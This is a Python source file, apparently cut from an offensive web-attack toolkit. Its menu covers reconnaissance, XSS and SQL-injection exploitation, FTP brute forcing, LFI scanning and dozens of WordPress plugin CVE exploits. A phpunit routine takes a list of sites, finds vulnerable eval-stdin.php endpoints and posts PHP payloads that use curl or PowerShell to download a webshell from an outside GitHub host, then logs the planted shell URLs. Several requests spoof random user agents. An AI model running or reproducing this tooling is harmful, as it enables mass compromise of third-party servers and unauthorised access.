                  JsonSRC['country_code'], Fore.RESET)
            print("---> ", Fore.LIGHTBLACK_EX, "country_code_iso3 : ",
                  JsonSRC['country_code_iso3'], Fore.RESET)
            print("---> ", Fore.CYAN, "country_capital : ",
                  JsonSRC['country_capital'], Fore.RESET)
            print("---> ", Fore.BLUE, "country_tld : ", JsonSRC['country_tld'],
                  Fore.RESET)
            print("---> ", Fore.GREEN, "continent_code : ",
                  JsonSRC['continent_code'], Fore.RESET)
            print("---> ", Fore.WHITE, "in_eu : ", JsonSRC['in_eu'],
                  Fore.RESET)
            print("---> ", Fore.MAGENTA, "postal : ", JsonSRC['postal'],
                  Fore.RESET)
            print("---> ", Fore.LIGHTMAGENTA_EX, "latitude : ",
                  JsonSRC['latitude'], Fore.RESET)
            print("---> ", Fore.LIGHTBLACK_EX, "longitude : ",
                  JsonSRC['longitude'], Fore.RESET)
            print("---> ", Fore.LIGHTCYAN_EX, "timezone : ",
                  JsonSRC['timezone'], Fore.RESET)
            print("---> ", Fore.WHITE, "utc_offset : ", JsonSRC['utc_offset'],
                  Fore.RESET)
            print("---> ", Fore.LIGHTGREEN_EX, "country_calling_code : ",
                  JsonSRC['country_calling_code'], Fore.RESET)
            print("---> ", Fore.LIGHTCYAN_EX, "currency : ",
                  JsonSRC['currency'], Fore.RESET)
            print("---> ", Fore.BLUE, "currency_name : ",
                  JsonSRC['currency_name'], Fore.RESET)
            print("---> ", Fore.RED, "languages : ", JsonSRC['languages'],
                  Fore.RESET)
            print("---> ", Fore.YELLOW, "country_area : ",
                  JsonSRC['country_area'], Fore.RESET)
            print("---> ", Fore.CYAN, "country_population : ",
                  JsonSRC['country_population'], Fore.RESET)
            print("---> ", Fore.LIGHTRED_EX, "asn : ", JsonSRC['asn'],
                  Fore.RESET)
            print("---> ", Fore.LIGHTGREEN_EX, "org : ", JsonSRC['org'],
                  Fore.RESET)
            print("--------" * 21)
        except EnvironmentError as A:
            pass

    def Whois(target):
        print(
            Fore.LIGHTBLACK_EX, "--" * 3, ">", Fore.RED, """               
| ||_  _  o  _ 
|^|| |(_) | _> 
            """, Fore.LIGHTBLACK_EX, "<-------")
        target = target

        User_Agent = open('Payloads/UserAgents.txt', 'r').readlines()
        LisiUserAgent = str(random.choice(User_Agent)).strip()
        UserAgentREQUEST = {"User-Agent": LisiUserAgent}

        domain = f"https://api.hackertarget.com/whois/?q={target}"

        res = requests.get(url=domain, headers=UserAgentREQUEST).text

        print(Fore.LIGHTCYAN_EX, "-->")
        print(Fore.WHITE, res)
        print(Fore.LIGHTCYAN_EX, "-->")

        print("--------" * 21)

    def reverseiplookup(target):
        try:
            print(Fore.RED, "--" * 3, ">")
            print(
                Fore.LIGHTWHITE_EX, """
 __                                   
|__)_   _ _ _ _. _ | _  _ |     _   . 
| \(-\/(-| _)(-||_)|(_)(_)|(|_||_)  . 
                | | """)
            print(Fore.RED, "<-------")

            target = target
            domain = socket.gethostbyname(target)
            User_Agent = open('Payloads/UserAgents.txt', 'r').readlines()
            LisiUserAgent = str(random.choice(User_Agent)).strip()
            UserAgentREQUEST = {"User-Agent": LisiUserAgent}
            api = "https://api.hackertarget.com/reverseiplookup/?q="
            url = f"{api}{domain}"

            r = requests.session()
            req = r.get(url=url, headers=UserAgentREQUEST)
            print("--------" * 21)
            print(Fore.WHITE, "-->")
            if "API count exceeded - Increase Quota with Membership" in req.text:
                print("Sorry Is HaveERROR..")
                exit()
            else:
                print(Fore.WHITE, req.text)
                print("-->")

            print("--------" * 21)

        except EnvironmentError:
            pass

    def httpheaders(target):

        print(
            Fore.LIGHTBLACK_EX, "--" * 3, ">", Fore.LIGHTYELLOW_EX,
            """            
                               
|_ |_|_ _ |_  _ _  _| _ _ _  . 
| )|_|_|_)| )(-(_|(_|(-| _)  . 
       |                                        """, Fore.LIGHTBLACK_EX,
            "<-------")

        try:

            target = target
            User_Agent = open('Payloads/UserAgents.txt', 'r').readlines()
            LisiUserAgent = str(random.choice(User_Agent)).strip()
            UserAgentREQUEST = {"User-Agent": LisiUserAgent}

            url = f"https://api.hackertarget.com/httpheaders/?q={target}"
            r = requests.session()
            req = r.get(url=url, headers=UserAgentREQUEST)
            print(Fore.RED, "-->")
            print(Fore.WHITE, req.text)
            print("-->")
            print("--------" * 21)
        except EnvironmentError as PR:
            pass

    def TCP_Port_Scan(target):
        print(
            Fore.WHITE, "--" * 3, ">", Fore.LIGHTBLACK_EX, """
___ __ __  __        __            
 | /  |__)|__)_  _|_(_  _ _  _   . 
 | \__|   |  (_)| |___)(_(_|| )  . 
                                    
        """, Fore.WHITE, "<-------")

        r = requests.session()
        target = target
        domain = socket.gethostbyname(target)

        User_Agent = open('Payloads/UserAgents.txt', 'r').readlines()
        LisiUserAgent = str(random.choice(User_Agent)).strip()
        UserAgentREQUEST = {"User-Agent": LisiUserAgent}

        url = f"https://api.hackertarget.com/nmap/?q={domain}"
        reqport = r.get(url=url, headers=UserAgentREQUEST)
        print(Fore.MAGENTA, "-->")
        print(Fore.WHITE, reqport.text)
        print(Fore.MAGENTA, "-->")
        print("--------" * 21)

    def dnslookup(target):
        print(
            Fore.CYAN, "--" * 3, ">", Fore.LIGHTBLACK_EX, """        
                           
 _| _  _| _  _ |     _   . 
(_|| )_)|(_)(_)|(|_||_)  . 
                    |      
      
  
                    |   
        """, Fore.CYAN, "<-------")
        target = target
        User_Agent = open('Payloads/UserAgents.txt', 'r').readlines()
        LisiUserAgent = str(random.choice(User_Agent)).strip()
        UserAgentREQUEST = {"User-Agent": LisiUserAgent}
        url = f"https://api.hackertarget.com/dnslookup/?q={target}"
        req = requests.get(url=url, headers=UserAgentREQUEST)
        print(Fore.LIGHTYELLOW_EX, "-->")
        print(Fore.YELLOW, req.text)
        print(Fore.LIGHTYELLOW_EX, "-->")
        print("--------" * 21)

    def mtr(target):
        print(
            Fore.WHITE, "--" * 3, ">", Fore.RED, """
    ___ __     
|\/| | |__)  . 
|  | | | \   . 
                
            """, Fore.WHITE, "<-------")
        target = target
        domain = socket.gethostbyname(target)

        User_Agent = open('Payloads/UserAgents.txt', 'r').readlines()
        LisiUserAgent = str(random.choice(User_Agent)).strip()
        UserAgentREQUEST = {"User-Agent": LisiUserAgent}
        url = f"https://api.hackertarget.com/mtr/?q={domain}"

        req = requests.get(url=url, headers=UserAgentREQUEST)

        print(Fore.LIGHTBLACK_EX, "-->")
        print(Fore.LIGHTBLUE_EX, req.text)
        print(Fore.LIGHTBLACK_EX, "-->")
        print("--------" * 21)

    def DNS_Host_Records_Subdomains(target):
        print(
            Fore.RED, "--" * 3, ">", Fore.LIGHTBLUE_EX, """
 __      __            __               __                        ___ __     
|  \|\ |(_ |__| _  _|_|__)_ _ _  _ _| _(_    |_  _| _  _  _ . _  _ | |__)  . 
|__/| \|__)|  |(_)_)|_| \(-(_(_)| (_|_)__)|_||_)(_|(_)|||(_||| )_) | | \   . 
                                                                                                                                                  
              """, Fore.RED, "<-------")
        target = target
        User_Agent = open('Payloads/UserAgents.txt', 'r').readlines()
        LisiUserAgent = str(random.choice(User_Agent)).strip()
        UserAgentREQUEST = {"User-Agent": LisiUserAgent}
        domain = f"https://api.hackertarget.com/hostsearch/?q={target}"
        res = requests.get(url=domain, headers=UserAgentREQUEST)
        PrintSrc = res.content

        print(Fore.LIGHTMAGENTA_EX, "-->")
        print(Fore.WHITE, PrintSrc)
        print(Fore.LIGHTMAGENTA_EX, "-->")
        print("--------" * 21)

    def Zone_Transfer_Online_Test(target):
        print(
            Fore.YELLOW, "--" * 3, ">", Fore.LIGHTYELLOW_EX, """
___        ___          _     __           ___         
 _/ _  _  _ | _ _  _  _(_ _ _/  \ _ |. _  _ | _ _|_  . 
/__(_)| )(- || (_|| )_)| (-| \__/| )||| )(- |(-_)|_  . 
                                                       
              
              """, Fore.YELLOW, "<-------")
        target = target
        User_Agent = open('Payloads/UserAgents.txt', 'r').readlines()
        LisiUserAgent = str(random.choice(User_Agent)).strip()
        UserAgentREQUEST = {"User-Agent": LisiUserAgent}
        Domain_Zone_Transfer_Online_Test = f"https://api.hackertarget.com/zonetransfer/?q={target}"
        res = requests.get(url=Domain_Zone_Transfer_Online_Test,
                           headers=UserAgentREQUEST)

        PrintSrc = res.content
        print(Fore.LIGHTRED_EX, "-->")
        print(Fore.LIGHTBLACK_EX, PrintSrc)
        print(Fore.LIGHTRED_EX, "-->")
        print("--------" * 21)

    def Subnet_Lookup_Online(target):
        print(
            Fore.BLUE, "--" * 3, ">", Fore.CYAN, """
 __                               __               
(_    |_  _  _|_|   _  _ |     _ /  \ _ |. _  _  . 
__)|_||_)| )(-|_|__(_)(_)|(|_||_)\__/| )||| )(-  . 
                              |                    
              """, Fore.BLUE, "<-------")
        target = target

        domain = socket.gethostbyname(target)

        User_Agent = open('Payloads/UserAgents.txt', 'r').readlines()
        LisiUserAgent = str(random.choice(User_Agent)).strip()
        UserAgentREQUEST = {"User-Agent": LisiUserAgent}
        domain_For_Requests = f"https://api.hackertarget.com/subnetcalc/?q={domain}"

        res = requests.get(url=domain_For_Requests, headers=UserAgentREQUEST)

        PrintSrc = res.content
        print(Fore.MAGENTA, "-->")
        print(Fore.LIGHTBLACK_EX, PrintSrc)
        print(Fore.MAGENTA, "-->")
        print("--------" * 21)


LinuxPayload = "<?php system('curl https://raw.githubusercontent.com/tanjiti/webshellSample/master/PHP/IndoXploit/k2ll3d.php -o k2ll3d.php'); ?>"
WindowsPayload = "<?php system('(New-Object System.Net.WebClient).DownloadFile(\"https://raw.githubusercontent.com/tanjiti/webshellSample/master/PHP/IndoXploit/k2ll3d.php\", \"k2ll3d.php\")'); ?>"
CheckVulnPayload = "<?php echo 'vuln' ?>"
CheckOSPayload = "<?php echo PHP_OS ?>"
timeouttime = 10


def LOGOPHPUNIT():

    print(Fore.CYAN, "╔═╗╦ ╦╔═╗╦ ╦╔╗╔╦╔╦╗")
    print(Fore.LIGHTMAGENTA_EX, "╠═╝╠═╣╠═╝║ ║║║║║ ║")
    print(Fore.WHITE, "╩  ╩ ╩╩  ╚═╝╝╚╝╩ ╩")


def VulnFound(url):
    f = open("Found.txt", "a")
    f.write(url + "\n")
    f.close()


def Work():
    print(Fore.WHITE, datetime.now())
    List = input("Enter Your List : ")
    f = open(List)
    Domains = f.readlines()
    for Domain in Domains:
        try:
            url = Domain.strip(
            ) + "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"

            resp = requests.post(url,
                                 data=CheckVulnPayload,
                                 timeout=timeouttime,
                                 verify=False,
                                 allow_redirects=False)
            if resp.text.strip() == "vuln":
                print("Vuln-Post")
                resp = requests.post(url,
                                     data=CheckOSPayload,
                                     timeout=timeouttime,
                                     verify=False,
                                     allow_redirects=False)
                print("OS:", resp.text.strip().lower())
                if resp.text.strip().lower() == "Linux".lower():
                    resp = requests.post(url,
                                         data=LinuxPayload,
                                         timeout=timeouttime,
                                         verify=False,
                                         allow_redirects=False)
                    print("Go to", url + "/../k2ll3d.php")
                    VulnFound(url + "/../k2ll3d.php")
                elif resp.text[:3].lower() == 'WIN'.lower():
                    resp = requests.post(url,
                                         data=WindowsPayload,
                                         timeout=timeouttime,
                                         verify=False,
                                         allow_redirects=False)
                    print(datetime.now(), Fore.CYAN, "Go to",
                          url + "/../k2ll3d.php")
                    VulnFound(url + "/../k2ll3d.php")
            resp = requests.get(url,
                                data=CheckVulnPayload,
                                timeout=timeouttime,
                                verify=False,
                                allow_redirects=False)
            if resp.text.strip() == "vuln":
                print(Fore.CYAN, datetime.now(), "Vuln-get")
                resp = requests.get(url,
                                    data=CheckOSPayload,
                                    timeout=timeouttime,
                                    verify=False,
                                    allow_redirects=False)
                print("OS:", resp.text.strip().lower())
                if resp.text.strip().lower() == "Linux".lower():
                    resp = requests.get(url,
                                        data=LinuxPayload,
                                        timeout=timeouttime,
                                        verify=False,
                                        allow_redirects=False)
                    print(datetime.now(), Fore.CYAN, "Go to",
                          url + "/../k2ll3d.php")
                    VulnFound(url + "/../k2ll3d.php")
                elif resp.text[:3].lower() == 'WIN'.lower():
                    resp = requests.get(url,
                                        data=WindowsPayload,
                                        timeout=timeouttime,
                                        verify=False,
                                        allow_redirects=False)
                    print(datetime.now(), Fore.CYAN, "Go to",
                          url + "/../k2ll3d.php")
                    VulnFound(url + "/../k2ll3d.php")
            elif resp.text.strip() != "vuln":
                print(datetime.now(), Fore.RED, "Not Vuln")
        except Timeout:
            print(datetime.now(), Fore.RED, "Not Vuln")
        except Exception as e:
            print(Fore.RED, "Error:", e)

YOUR_Email_For_TAkeAdmin_Exploit = "Email.google.com"
r = Fore.RED
g = Fore.LIGHTGREEN_EX  
y = Fore.CYAN 
b = Fore.LIGHTMAGENTA_EX  
m = Fore.LIGHTYELLOW_EX  
c = Fore.LIGHTGREEN_EX  
w = Fore.WHITE  
def Rez(site, i):
    #By Jex Bot
    try:
        if 'YES' in str(i):
            print(
                Fore.WHITE, "[ ", datetime.now(), " ]", Fore.WHITE,
                ' FoundVuln {}+ {}{} {} ==>[ {}{} {} ] YES!{}'.format(
                    g, w, site, c, y, i[2], g, w))
        else:
            print(
                Fore.RED, "[ ", datetime.now(), " ]", Fore.RED,
                'NotFoundVuln  {}- {}{} {} ==> [ {}{} {} ] NO!{}'.format(
                    r, w, site, c, y, i[2], r, w))
    except:
        print(
            Fore.RED, "[ ", datetime.now(), " ]", Fore.RED,
            ' {}- {}{} {} == > [ {}{} {} ] NO!{}'.format(
                r, w, site, c, y, i[2], r, w))



def LFI():

    try:
        
        
        print(Fore.YELLOW,"| |/ _(_)  ___ __ __ _ _ _  _ _ (_)_ _  __ _ ")
        print(Fore.WHITE,"| |  _| | (_-</ _/ _` | ' \| ' \| | ' \/ _` |")
        print(Fore.LIGHTGREEN_EX,"|_|_| |_| /__/\__\__,_|_||_|_||_|_|_||_\__, |")
        print(Fore.LIGHTBLACK_EX,"                                        |___/")
        print(Fore.WHITE,"Scan start at : ",datetime.now())
        url = input(" Enter The Target  : ")
        payload = open("Payloads/Payload_LFI.txt", 'r')
        for i in payload:

            time.sleep(4)
            rurl = f"{url}{i}".strip()
            req = requests.get(url=rurl)
            if req.status_code == 200:

                if re.findall("root:", req.text):
                    print(Fore.CYAN,f"exploit  --> {req.url}")
                    break

                elif re.findall("127.0.0.1", req.text):
                    print(f"exploit --> {req.url}")
                    break

                else:
                    print(Fore.RESET,"No", req.url)
            else:
                print("is Error , becouse status_code is not 200 .. ")
    except EnvironmentError:
        print(Fore.LIGHTMAGENTA_EX, " sorry you have error.")

def https_http(url):
    if url.startswith('http://'):
        url = site.replace('http://', '')
    elif url.startswith("https://"):
        url = url.replace('https://', '')
    else:
        pass
    return url
init()
print(Fore.RED,"COder By Daxe & BinAl5tabe &spooky")
time.sleep(2)
system()
print(Fore.WHITE, "                         __    _               ")
time.sleep(0.1)
print(Fore.WHITE, "                    _wr" "        ''-q__           ")
time.sleep(0.1)
print(Fore.WHITE, "                 _dP                 9m_     ")
time.sleep(0.1)
print(Fore.WHITE, "               _#P                     9#_     ")
time.sleep(0.1)
print(Fore.WHITE, "              d#@                       9#m      ")
time.sleep(0.1)
print(Fore.WHITE, "             d##                         ###       ")
time.sleep(0.1)
print(Fore.WHITE, "            J###                         ###L        ")
time.sleep(0.1)
print(Fore.WHITE, "            {###K                       J###K          ")
time.sleep(0.1)
print(Fore.WHITE, "            ]####K      ___aaa___      J####F            ")
time.sleep(0.1)
print(Fore.WHITE, "        __gmM######_  w#P"
      "   "
      "9#m  _d#####Mmw__          ")
time.sleep(0.1)
print(Fore.WHITE,
      "    _g##############mZ_         __g##############m_          ")
time.sleep(0.1)
print(Fore.WHITE,
      "   _d####M@PPPP@@M#######Mmp gm#########@@PPP9@M####m_         ")
time.sleep(0.1)
print(Fore.WHITE, "  a###AA          ,ZLDAXEEELL LDAXEEEEL\g          "
      "M##m          ")
time.sleep(0.1)
print(Fore.WHITE,
      " J#@S             0L  S*##     ##@C  JS              SSK           ")
time.sleep(0.1)
print(Fore.WHITE,
      " #C               `#    C_gmwgm_~    dF               `#_          ")
time.sleep(0.1)
print(Fore.WHITE,
      "7F                 C#_   ]#####F   _dK                 JE          ")
time.sleep(0.1)
print(Fore.WHITE,
      "]                    *m__ ##### __g@F                   F          ")

time.sleep(0.1)
print(Fore.WHITE,
      "                       CPJ#####LPC                                 ")
time.sleep(0.1)
print(Fore.WHITE,
      " `                       0######_                      '           ")
time.sleep(0.1)
print(Fore.WHITE,
      "                       _0########_                                   ")
time.sleep(0.1)
print(Fore.WHITE,
      "     .               _d#####^#####m__              ,              ")
time.sleep(0.1)
print(Fore.WHITE,
      "      C*w_________am#####PC   C9#####mw_________w*C                 ")
time.sleep(0.1)
print(Fore.WHITE, "          VV9@#####@MVV           VVP@#####@MVV ")

print(
    Fore.WHITE, '''
[1] -  Searching for Subdomain .
[2] -  Scan XSS Reflected .
[3] -  Scan SQL injection And Exploit. 
[4] -  Brute Force Linkes page . 
[5] -  FTP Burte Force  .
[6] -  Search phpunit Vuln and Upload Shell .
[7] -  information gathering webSite . 
[8] -  LFI Scan . 
[9] -  Dorks Scan With Sql injection . 
[10] - Scanner 65535 port . 
[11] - admin panel Found   . 
[12] - WordPress Scan .  ''')
try:
    Chose = input(Fore.WHITE + "</SiteCT> " + Fore.RESET).lower().strip()
except KeyboardInterrupt:
    print(Fore.RED,"GOOD BYE" , Fore.RESET)
    exit()
if Chose == '1':
    if __name__ == "__main__":
        system()
        socket.setdefaulttimeout(0.5)
        main()
	
elif Chose == '2':

    XSS = input("Reflected or Sotred : ").lower()
    if XSS == 'reflected':
        system()
        XSS_SCAN_ALL_TYPE.XSS_Reflected()
    elif XSS == 'sotred':
        print("sooon")
    else:
        exit()
elif Chose == '3':
    system()
    SqlScaNOrExploit = int(input("[1] - Exploit \ [2] - Scan Url/List  : "))
    if SqlScaNOrExploit == 1:
        SQLInjection()
    elif SqlScaNOrExploit == 2:
        if __name__ == '__main__':
    
            print(Fore.WHITE,SqlScaNOrExploit.SqlLOGO,Fore.RESET)
            MORS = input("Test Single Url? [N]:")
            Url = []
            if MORS.lower() == "y":
                Url.append(input("Url: "))
            else:
                file = open(input("Filename: "), "r")
                for url in file.readlines():
                    Url.append(url.strip())
                file.close()
            main_2()
    else:
        print("Sorry Is have Error . ")
elif Chose == '4':
    url = input(" Enter target URL : ")
    PathForcing(url)
    print("[+] ~ Start Now Another Technics ..")
    urls = https_http(url)
    print(urls)
    Bring_Links(urls)
    print("[+] ~ Start Now Another Technics2 ..")
    Path_With_GOOGLE(urls)

elif Chose == '5':
    system()
    logo = Fore.WHITE + '''

 ____ ____ ____ ____ ____ ____ ____ ____ ____ ____ ____ ____ ____ 
||F |||P |||T |||B |||u |||r |||t |||e |||F |||o |||r |||c |||e ||
||__|||__|||__|||__|||__|||__|||__|||__|||__|||__|||__|||__|||__||
|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|
                                                                      
    ''' + Fore.RESET   
    print(logo) 
        
    target = input(Fore.WHITE+"[~] ENTER THE TARGET IP: ")
    username = input(Fore.CYAN+"[~] ENTER THE USERNAME: ")
    wordlist = input(Fore.WHITE+"[~] ENTER THE PATH TO THE WORDLIST: ")

    instance = ftp(target, username, 'Payloads\FTP.txt')
    instance.anonymous()
    instance.login("a_password")
    instance.brute_force()

elif Chose == '6':
    system()
    LOGOPHPUNIT()
    Work()
elif Chose == '7':
    system()
    print(
        Fore.WHITE +
        "-------------------------------------------------------------------------"
        + res)
    #print(color + logo + res)

    print(Fore.WHITE, "╦╔╗╔╔═╗╔═╗  ╔═╗╔═╗╔╦╗╦ ╦╦═╗╦╔╗╔╔═╗")
    print(Fore.YELLOW, "║║║║╠╣ ║ ║  ║ ╦╠═╣ ║ ╠═╣╠╦╝║║║║║ ╦")
    print(Fore.GREEN, "╩╝╚╝╚  ╚═╝  ╚═╝╩ ╩ ╩ ╩ ╩╩╚═╩╝╚╝╚═╝")
    print('''''')
    print(Fore.YELLOW + " " + "information gathering  started at:" +
        str(datetime.now()))
    print(Fore.LIGHTGREEN_EX + " " +
        "Example of input  : yahoo.com , google.com")
    print(
        Fore.WHITE +
        "-------------------------------------------------------------------------"
        + res)
    target = input(Fore.LIGHTWHITE_EX + "Enter Your  TARGET :")
    Information_Gethring.ipapi_co(target)
    time.sleep(3)
    Information_Gethring.reverseiplookup(target)
    time.sleep(3)
    Information_Gethring.httpheaders(target)
    time.sleep(3)
    Information_Gethring.TCP_Port_Scan(target)
    time.sleep(3)
    Information_Gethring.dnslookup(target)
    time.sleep(3)
    Information_Gethring.mtr(target)
    time.sleep(3)
    Information_Gethring.DNS_Host_Records_Subdomains(target)
    time.sleep(3)
    Information_Gethring.Zone_Transfer_Online_Test(target)
    time.sleep(3)
    Information_Gethring.Subnet_Lookup_Online(target)
    time.sleep(3)

elif Chose == '8':
    system()
    LFI()
elif Chose == '9':
    system()
    DORK = input("Dork :  ")
    Dork_scan_sql(DORK,1000)
elif Chose == '10':
    system()
    Enter = input(" Enter Your Target : ")
    Port_SCANNER(Enter)

elif Chose == '11':
    system()
    AdminPageFinder()
elif Chose == '12':
    system()
    print(Fore.BLUE,
        " __                __    __              _   ___                   ")
    print(Fore.GREEN,
        "/ _\ ___ __ _ _ __/ / /\ \ \___  _ __ __| | / _ \_ __ ___  ___ ___ ")
    print(Fore.LIGHTMAGENTA_EX,
        "\ \ / __/ _` | '_ \ \/  \/ / _ \| '__/ _` |/ /_)/ '__/ _ \/ __/ __|")
    print(Fore.LIGHTCYAN_EX,
        "_\ \ (_| (_| | | | \  /\  / (_) | | | (_| / ___/| | |  __/\__ \__ ")
    print(Fore.LIGHTYELLOW_EX,
        "\__/\___\__,_|_| |_|\/  \/ \___/|_|  \__,_\/    |_|  \___||___/___/")

    site = input(" Enter Your Target : ")
    if site.startswith('http://'):
        site = site.replace('http://', '')
    elif site.startswith("https://"):
        site = site.replace('https://', '')
    else:
        pass
    Check_CMs = input(" WordPress[Y/N] : ")
    if Check_CMs == 'Y':
        i = CVE_2019_9978SocialWarfare.Exploit(site)
        Rez(site, i)
        i = cherry_plugin.Exploit(site)
        Rez(site, i)
        i = CVE_2008_3362Download_Manager.Exploit(site)
        Rez(site, i)
        i = CVE_2014_4725wysija.Exploit(site)
        Rez(site, i)
        i = CVE_2014_9735_revsliderShell.Exploit(site)
        Rez(site, i)
        i = CVE_2015_1579_revsliderConfig.Exploit(site)
        Rez(site, i)
        i = CVE_2015_4455_gravityformsindex.Exploit(site)
        Rez(site, i)
        i = CVE_2015_4455_gravityforms.Exploit(site)
        Rez(site, i)
        i = CVE_2015_5151_revsliderCSS.Exploit(site)
        Rez(site, i)
        i = CVE_2017_16562userpro.Exploit(site)
        Rez(site, i)
        i = CVE_2018_19207wp_gdpr_compliance.Exploit(
            site, YOUR_Email_For_TAkeAdmin_Exploit)
        Rez(site, i)
        i = CVE_2019_9879wp_graphql.Exploit(site, YOUR_Email_For_TAkeAdmin_Exploit)
        Rez(site, i)
        i = formcraft.Exploit(site)
        Rez(site, i)
        i = Wp_contabileads.Exploit(site)
        Rez(site, i)
        i = Wp_prh_api.Exploit(site)
        Rez(site, i)
        i = Wp_mmplugin.Exploit(site)
        Rez(site, i)
        i = Wp_dzs_videogallery.Exploit(site)
        Rez(site, i)
        i = Headway.Exploit(site)
        Rez(site, i)
        i = pagelinesExploit.Exploit(site)
        Rez(site, i)
        i = WooCommerce_ProductAddonsExp.Exploit(site)
        Rez(site, i)
        i = WpCateGory_page_icons.Exploit(site)
        Rez(site, i)
        i = Wp_addblockblocker.Exploit(site)
        Rez(site, i)
        i = wp_barclaycart.Exploit(site)
        Rez(site, i)
        i = wp_content_injection.Exploit(site)
        Rez(site, i)
        i = wp_eshop_magic.Exploit(site)
        Rez(site, i)
        i = WPJekyll_Exporter.Exploit(site)
        Rez(site, i)
        i = Wp_cloudflare.Exploit(site)
        Rez(site, i)
        i = Wprealia.Exploit(site)
        Rez(site, i)
        i = Wpwoocommercesoftware.Exploit(site)
        Rez(site, i)
        i = Wp_enfold_child.Exploit(site)
        Rez(site, i)
        i = Wp_HD_WebPlayer.Exploit(site)
        Rez(site, i)
        i = Wp_Job_Manager.Exploit(site)
        Rez(site, i)
        i = wp_miniaudioplayer.Exploit(site)
        Rez(site, i)
        i = Wp_pagelines.Exploit(site)
        Rez(site, i)
        i = wp_support_plus_responsive_ticket_system.Exploit(site)
        Rez(site, i)
        i = wp_ungallery.Exploit(site)
        Rez(site, i)
        i = WP_User_Frontend.Exploit(site)
        Rez(site, i)
        i = viral_optinsExploit.Exploit(site)
        Rez(site, i)
        i = wpinstall.Exploit(site)
        Rez(site, i)
        i = CVE_2006_2529fckeditor.Exploit(site, 'Wordpress')
        Rez(site, i)
        i = phpunit.Exploit(site, 'Wordpress')
        Rez(site, i)
    else:
        print("ERROR")
elif Chose == "help":
    print("Soon")
